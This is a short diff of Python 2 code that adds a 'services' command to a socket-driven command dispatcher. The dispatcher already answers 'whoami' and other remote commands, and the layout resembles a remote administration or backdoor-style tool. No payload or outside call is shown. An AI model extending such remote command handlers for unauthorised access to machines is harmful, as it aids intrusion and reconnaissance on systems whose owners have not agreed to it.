@@ -26,6 +26,8 @@ while True:
             c.send(callMDF())
         elif(result == 'whoami'):
             c.send(whoAmiI())
+        elif(result == 'services'):
+            c.send(services())
         elif(result == 'q'):
             print '\tKILL, terminating: ', addr
             c.send('2')
